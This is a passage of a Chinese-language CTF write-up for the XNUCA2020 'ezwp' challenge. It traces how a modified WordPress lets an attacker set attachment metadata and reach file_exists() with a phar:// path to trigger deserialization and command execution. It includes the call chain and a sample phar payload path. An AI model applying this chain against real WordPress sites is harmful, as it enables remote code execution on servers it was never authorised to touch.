invoke__">is_array</span>(<span class="variable">$imagedata</span> ) ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">get_attached_file</span>(<span class="variable">$post</span>-&gt;ID );</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$imagedata</span>[<span class="string">&#x27;thumb&#x27;</span>] ) ) &#123;</span><br><span class="line">    <span class="variable">$thumbfile</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$file</span> ), <span class="variable">$imagedata</span>[<span class="string">&#x27;thumb&#x27;</span>], <span class="variable">$file</span> );</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$thumbfile</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>可以成功触发。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/2.png"></p><p>最终的漏洞利用链如下。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">switch case &#x27;edit&#x27; [wp-admin/media.php:47] -&gt;</span><br><span class="line">get_media_item [wp-admin/media.php:142] -&gt;</span><br><span class="line">get_attachment_fields_to_edit [wp-admin/includes/media.php:1596] -&gt;</span><br><span class="line">image_size_input_fields [wp-admin/includes/media.php:1459] -&gt;</span><br><span class="line">image_downsize [wp-admin/includes/media.php:1156] -&gt;</span><br><span class="line">wp_get_attachment_thumb_file [wp-includes/media.php:244] -&gt;</span><br><span class="line">file_exists(&quot;phar://.....&quot;) [wp-includes/post.php:6148] -&gt;</span><br><span class="line">execute command</span><br></pre></td></tr></table></figure><p>接下来就需要控制_wp_attachment_metadata 与_wp_attached_file 字段的值，其中_wp_attachment_metadata 字段就是 imagedata 的值，_wp_attached_file 就是 file 的值，控制 file 为 <code>Z:\Z</code> 之后就要控制 imagedata[‘thumb’]的值为<code>phar://../wp-content/uploads/2020/12/a.gif/test.txt</code>，a.gif 就是上传的附件。</p><p>在以前的 WordPress 中可以通过 meta_input 参数就可以直接控制数据库中各表的数据，但是之后 WordPress 补了这个洞，Patch 如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns only allowed post data fields</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 5.0.1</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $post_data Array of post data. Defaults to the contents of $_POST.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|WP_Error Array of post data on success, WP_Error on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_wp_get_allowed_postdata</span>(<span class="params"> <span class="variable">$post_data</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$post_data</span> ) ) &#123;</span><br><span class="line">        <span class="variable">$post_data</span> = <span class="variable">$_POST</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pass through errors.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_wp_error</span>(<span class="variable">$post_data</span> ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$post_data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_diff_key</span>(<span class="variable">$post_data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="keyword">array</span>(<span class="string">&#x27;meta_input&#x27;</span>, <span class="string">&#x27;guid&#x27;</span> ) ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接过滤了 meta_input 与 guid 参数，另外需要说明的是在官方的补丁中还包含了 file 参数，但是在该题目中却并没有（上面的源码是题目中的）这就导致了可以利用 file 参数控制_wp_attachment_metadata 与_wp_attached_file 字段。</p><h1 id="wp-attached-file"><a href="#wp-attached-file" class="headerlink" title="wp_attached_file"></a>wp_attached_file</h1><p>首先需要修改_wp_attached_file 字段。在 /wp-admin/post.php 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span> ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;editpost&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">check_admin_referer</span>(<span class="string">&#x27;update-post_&#x27;</span> . <span class="variable">$post_id</span> );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$post_id</span> = <span class="title function_ invoke__">edit_post</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Session cookie flag that the post was saved.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;wp-saving-post&#x27;</span>] ) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;wp-saving-post&#x27;</span>] === <span class="variable">$post_id</span> . <span class="string">&#x27;-check&#x27;</span> ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;wp-saving-post&#x27;</span>, <span class="variable">$post_id</span> . <span class="string">&#x27;-saved&#x27;</span>, <span class="title function_ invoke__">time</span>() + DAY_IN_SECONDS, ADMIN_COOKIE_PATH, COOKIE_DOMAIN, <span class="title function_ invoke__">is_ssl</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">redirect_post</span>(<span class="variable">$post_id</span> ); <span class="comment">// Send user on their way while we keep working.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流程转入 edit_post 函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update an existing post with values provided in $_POST.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If post data is passed as an argument, it is treated as an array of data</span></span><br><span class="line"><span class="comment"> * keyed appropriately for turning into a post object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If post data is not passed, the $_POST global variable is used instead.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@global</span> wpdb $wpdb WordPress database abstraction object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $post_data Optional. Defaults to the $_POST global.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int Post ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_post</span>(<span class="params"> <span class="variable">$post_data</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    <span class="variable">$post_data</span> = <span class="title function_ invoke__">_wp_translate_postdata</span>(<span class="literal">true</span>, <span class="variable">$post_data</span> );</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_wp_error</span>(<span class="variable">$post_data</span> ) ) &#123;</span><br><span class="line">        <span class="title function_ invoke__">wp_die</span>(<span class="variable">$post_data</span>-&gt;<span class="title function_ invoke__">get_error_message</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$translated</span> = <span class="title function_ invoke__">_wp_get_allowed_postdata</span>(<span class="variable">$post_data</span> );</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Attachment stuff.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;attachment&#x27;</span> === <span class="variable">$post_data</span>[<span class="string">&#x27;post_type&#x27;</span>] ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$post_data</span>[<span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>] ) ) &#123;</span><br><span class="line">            <span class="variable">$image_alt</span> = <span class="title function_ invoke__">wp_unslash</span>(<span class="variable">$post_data</span>[<span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>] );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">get_post_meta</span>(<span class="variable">$post_ID</span>, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="literal">true</span> ) !== <span class="variable">$image_alt</span> ) &#123;</span><br><span class="line">                <span class="variable">$image_alt</span> = <span class="title function_ invoke__">wp_strip_all_tags</span>(<span class="variable">$image_alt</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">                <span class="comment">// update_post_meta() expects slashed.</span></span><br><span class="line">                <span class="title function_ invoke__">update_post_meta</span>(<span class="variable">$post_ID</span>, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="title function_ invoke__">wp_slash</span>(<span class="variable">$image_alt</span> ) );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$attachment_data</span> = <span class="keyword">isset</span>(<span class="variable">$post_data</span>[<span class="string">&#x27;attachments&#x27;</span>][<span class="variable">$post_ID</span> ] ) ? <span class="variable">$post_data</span>[<span class="string">&#x27;attachments&#x27;</span>][<span class="variable">$post_ID</span> ] : <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** This filter is documented in wp-admin/includes/media.php */</span></span><br><span class="line">        <span class="variable">$translated</span> = <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;attachment_fields_to_save&#x27;</span>, <span class="variable">$translated</span>, <span class="variable">$attachment_data</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="variable">$success</span> = <span class="title function_ invoke__">wp_update_post</span>(<span class="variable">$translated</span> );</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 translated 保存了过滤后的 post 数据，由于题目中没有过滤 file 参数，所以这里的 translated 中依旧存在 file 参数。再看 wp_update_post 函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update a post with new post data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The date does not have to be set for drafts. You can set the date and it will</span></span><br><span class="line"><span class="comment"> * not be overridden.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array|object $postarr  Optional. Post data. Arrays are expected to be escaped,</span></span><br><span class="line"><span class="comment"> *                               objects are not. Default array.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool         $wp_error Optional. Allow return of WP_Error on failure. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int|WP_Error The post ID on success. The value 0 or WP_Error on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_update_post</span>(<span class="params"> <span class="variable">$postarr</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$wp_error</span> = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Merge old and new fields with new fields overwriting old ones.</span></span><br><span class="line">    <span class="variable">$postarr</span>                  = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$post</span>, <span class="variable">$postarr</span> );</span><br><span class="line">    <span class="variable">$postarr</span>[<span class="string">&#x27;post_category&#x27;</span>] = <span class="variable">$post_cats</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clear_date</span> ) &#123;</span><br><span class="line">        <span class="variable">$postarr</span>[<span class="string">&#x27;post_date&#x27;</span>]     = <span class="title function_ invoke__">current_time</span>(<span class="string">&#x27;mysql&#x27;</span> );</span><br><span class="line">        <span class="variable">$postarr</span>[<span class="string">&#x27;post_date_gmt&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">wp_insert_post</span>(<span class="variable">$postarr</span>, <span class="variable">$wp_error</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流程转入到 wp_insert_post。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Insert or update a post.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If the $postarr parameter has &#x27;ID&#x27; set to a value, then post will be updated.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can set the post date manually, by setting the values for &#x27;post_date&#x27;</span></span><br><span class="line"><span class="comment"> * and &#x27;post_date_gmt&#x27; keys. You can close the comments or open the comments by</span></span><br><span class="line"><span class="comment"> * setting the value for &#x27;comment_status&#x27; key.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.2.0 Support was added for encoding emoji in the post title, content, and excerpt.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.4.0 A &#x27;meta_input&#x27; array can now be passed to `$postarr` to add post meta data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_insert_post</span>(<span class="params"> <span class="variable">$postarr</span>, <span class="variable">$wp_error</span> = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;attachment&#x27;</span> === <span class="variable">$postarr</span>[<span class="string">&#x27;post_type&#x27;</span>] ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$postarr</span>[<span class="string">&#x27;file&#x27;</span>] ) ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">update_attached_file</span>(<span class="variable">$post_ID</span>, <span class="variable">$postarr</span>[<span class="string">&#x27;file&#x27;</span>] );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$postarr</span>[<span class="string">&#x27;context&#x27;</span>] ) ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">add_post_meta</span>(<span class="variable">$post_ID</span>, <span class="string">&#x27;_wp_attachment_context&#x27;</span>, <span class="variable">$postarr</span>[<span class="string">&#x27;context&#x27;</span>], <span class="literal">true</span> );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接传递 postarr[‘file’]，再看 update_attached_file。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update attachment file path based on attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Used to update the file path of the attachment, which uses post meta name</span></span><br><span class="line"><span class="comment"> * &#x27;_wp_attached_file&#x27; to store the path of the attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $file          File path for the attachment.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool True on success, false on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_attached_file</span>(<span class="params"> <span class="variable">$attachment_id</span>, <span class="variable">$file</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="title function_ invoke__">get_post</span>(<span class="variable">$attachment_id</span> ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Filters the path to the attached file to update.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $file          Path to the attached file to update.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int    $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;update_attached_file&#x27;</span>, <span class="variable">$file</span>, <span class="variable">$attachment_id</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">_wp_relative_upload_path</span>(<span class="variable">$file</span> );</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">update_post_meta</span>(<span class="variable">$attachment_id</span>, <span class="string">&#x27;_wp_attached_file&#x27;</span>, <span class="variable">$file</span> );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">delete_post_meta</span>(<span class="variable">$attachment_id</span>, <span class="string">&#x27;_wp_attached_file&#x27;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接通过 update_post_meta 更新_wp_attached_file 字段，最终导致 file 可控。</p><h1 id="wp-attachment-metadata"><a href="#wp-attachment-metadata" class="headerlink" title="wp_attachment_metadata"></a>wp_attachment_metadata</h1><p>接下来修改_wp_attachmen\t_metadata 字段，同样在在 /wp-admin/post.php 中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span> ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;editattachment&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">check_admin_referer</span>(<span class="string">&#x27;update-post_&#x27;</span> . <span class="variable">$post_id</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Don&#x27;t let these be changed.</span></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guid&#x27;</span>] );</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;post_type&#x27;</span>] = <span class="string">&#x27;attachment&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the thumbnail filename.</span></span><br><span class="line">        <span class="variable">$newmeta</span>          = <span class="title function_ invoke__">wp_get_attachment_metadata</span>(<span class="variable">$post_id</span>, <span class="literal">true</span> );</span><br><span class="line">        <span class="variable">$newmeta</span>[<span class="string">&#x27;thumb&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;thumb&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">wp_update_attachment_metadata</span>(<span class="variable">$post_id</span>, <span class="variable">$newmeta</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Intentional fall-through to trigger the edit_post() call.</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;editpost&#x27;</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个 wp_update_attachment_metadata，参数 newmeta[‘thumb’]刚好就是我们需要的 imagedata[‘thumb’]。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Updates metadata for an attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int   $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $data          Attachment meta data.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int|bool False if $post is invalid.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_update_attachment_metadata</span>(<span class="params"> <span class="variable">$attachment_id</span>, <span class="variable">$data</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$attachment_id</span> = (<span class="keyword">int</span>) <span class="variable">$attachment_id</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$post</span> = <span class="title function_ invoke__">get_post</span>(<span class="variable">$attachment_id</span> );</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$post</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Filters the updated attachment meta data.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data          Array of updated attachment meta data.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int   $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;wp_update_attachment_metadata&#x27;</span>, <span class="variable">$data</span>, <span class="variable">$post</span>-&gt;ID );</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">update_post_meta</span>(<span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span>, <span class="variable">$data</span> );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">delete_post_meta</span>(<span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接通过 update_post_meta 更新_wp_attachment_metadata 字段，导致 imagedata 可控。</p><h1 